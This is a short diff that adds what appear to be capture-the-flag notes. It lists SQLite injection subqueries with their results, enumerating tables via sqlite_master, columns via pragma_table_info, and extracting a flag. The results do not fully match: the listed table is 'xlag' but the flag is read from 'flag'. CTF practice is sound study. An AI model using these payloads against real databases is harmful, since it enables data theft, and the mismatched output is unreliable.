@@ -1,0 +1,3 @@
+(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table') => todos|xlag
+(SELECT group_concat(name) FROM pragma_table_info('xlag')) => 
+(SELECT flag FROM flag) => flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
